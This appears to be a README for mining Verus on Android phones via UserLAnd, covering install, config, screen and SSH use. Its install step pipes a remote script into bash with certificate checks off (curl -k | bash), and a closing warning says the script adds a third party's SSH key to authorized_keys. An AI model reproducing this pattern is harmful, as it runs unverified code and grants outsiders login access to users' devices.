

## Installation instructions
- install Userland app [Click here](/https://github.com/CypherpunkArmory/UserLAnd/releases/download/v2.8.3/app-release.apk)
- select Ubuntu in Userland and input login details.
- choose SSH
- wait for it to install, enter Ubuntu and log into your account
- Verus can be mined only on 64bit devices

```bash
curl -o- -k https://raw.githubusercontent.com/ShadowStorm404/Verus-Phone-Mining/main/install.sh | bash
```


## Usage

Edit the pool address you want to mine with, wallet address and workers name 
exit with `<CTRL>-X` followed by `y` and an `<ENTER>`
```bash
nano ~/ccminer/config.json
```

To start mining
```bash
~/ccminer/start.sh
```

Monitoring the miner:
- `screen -x CCminer`
- exit with `CTRL-a` key combination followed by `d`.

Terminating the miner:
`screen -X -S CCminer quit`

## Mining with screen off
- Pull down the notification panel, click on `Acquire wakelock` Keep in mind not all phones can perform scree off mining
- If acquire wakelock doesn't work on Huawei Devices, remove powergenie from phone. Unfortunately this is a system app and can only fully uninstalled using Android Debug Bridge

## SSH  
Standard SSH port for Userland is port `2022`.
Optional: create an entry in your SSH config file for each phone:
```
Host Pixel2XL01
    Hostname 192.168.25.81
    Port 2022
    User Pixel2XL01
    IdentityFile ~\.ssh\id-rsa_oink-private
```


## Monitoring your miners (on a linux host)
check [MONITORING](/monitoring/MONITORING.md).

WARNING: The scripts installs Oink's public SSH key. You may want to remove that from your `~/.ssh/authorized_keys` file and replace it with your own for passwordless access.

### Use at your own risk!!!
